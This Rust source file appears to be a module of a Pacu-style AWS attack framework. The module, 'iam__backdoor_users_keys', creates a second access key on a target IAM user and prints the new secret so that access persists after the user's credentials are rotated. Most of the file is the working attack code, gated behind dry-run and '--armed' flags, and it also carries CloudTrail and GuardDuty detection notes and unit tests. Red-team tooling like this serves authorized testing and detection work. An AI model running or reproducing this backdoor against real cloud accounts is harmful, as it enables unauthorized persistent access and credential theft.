//! iam__backdoor_users_keys — create a hidden access key on a target IAM user.
//!
//! Category: PERSIST. Services: ["IAM"]. Requires --armed for write operations.
//!
//! Concept: An attacker who has iam:CreateAccessKey on a target user can create
//! a second access key pair that they control, granting persistent access even
//! if the user's original credentials are rotated.
//!
//! Args:
//!   --username <name>   target IAM user (required)
//!   --exploit           actually create the key (requires --armed)
//!
//! Dry-run: print what would be called without touching AWS.
//!
//! Detection: CreateAccessKey where caller != target user —
//! CloudTrail shows CreateAccessKey with mismatched caller/target ARNs.
//! GuardDuty: Discovery:IAMUser/AnomalousBehavior + Persistence:IAMUser/UserPermissions

use anyhow::Context as _;
use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let username: &str = {
        let pos = args.iter().position(|&a| a == "--username");
        match pos.and_then(|i| args.get(i + 1).copied()) {
            Some(u) => u,
            None => anyhow::bail!("--username <name> is required"),
        }
    };

    let exploit = args.contains(&"--exploit");

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    println!("{}", "iam__backdoor_users_keys".cyan().bold());
    println!(
        "  Detection: CreateAccessKey where caller != target user — \
         CloudTrail shows CreateAccessKey with mismatched caller/target ARNs\n"
    );

    // ── Dry-run mode ───────────────────────────────────────────────────────
    if !exploit {
        println!(
            "  {} Would call: iam:CreateAccessKey on user {}",
            "[DRY-RUN]".cyan(),
            username.yellow()
        );
        println!(
            "\n{}",
            "Run with --exploit --armed to actually create the access key.".yellow()
        );
        return Ok(());
    }

    // ── Armed + exploit ───────────────────────────────────────────────────
    println!(
        "  {} Calling iam:CreateAccessKey on user '{}'...",
        "[EXEC]".red().bold(),
        username.yellow()
    );

    let iam = aws_sdk_iam::Client::new(&ctx.sdk_config);

    let resp = iam
        .create_access_key()
        .user_name(username)
        .send()
        .await
        .context("iam:CreateAccessKey failed")?;

    let key = resp.access_key().context("CreateAccessKey response missing AccessKey")?;
    let key_id = key.access_key_id();
    let secret = key.secret_access_key();

    println!("\n  {} Access key created:", "[OK]".green().bold());
    println!("  {:<22} {}", "AccessKeyId:".bold(), key_id.green());
    println!("  {:<22} {}", "SecretAccessKey:".bold(), secret.green());
    println!(
        "\n  {} {}",
        "[WARN]".yellow().bold(),
        "Store these credentials securely. They cannot be retrieved again.".yellow()
    );
    println!(
        "\n  GuardDuty Detection: Discovery:IAMUser/AnomalousBehavior + Persistence:IAMUser/UserPermissions"
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "iam__backdoor_users_keys",
            author: "lancer-pacu",
            category: "PERSIST",
            one_liner: "Create a hidden access key on a target IAM user for persistent access. Requires --armed + --exploit.",
            services: &["IAM"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "iam__backdoor_users_keys");
        assert!(found, "iam__backdoor_users_keys not found in inventory");
    }

    #[test]
    fn module_category_is_persist() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "iam__backdoor_users_keys")
            .expect("iam__backdoor_users_keys not found");
        assert_eq!(m.info.category, "PERSIST");
    }

    #[tokio::test]
    async fn missing_username_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // No --username provided
        let result = super::run(&ctx, &[]).await;
        assert!(result.is_err(), "expected error when --username is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--username"),
            "error should mention --username: {msg}"
        );
    }

    #[tokio::test]
    async fn dry_run_without_exploit_succeeds() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // Dry-run path: no API call, should succeed
        let result = super::run(&ctx, &["--username", "alice"]).await;
        assert!(result.is_ok(), "dry-run should succeed: {:?}", result.err());
    }
}
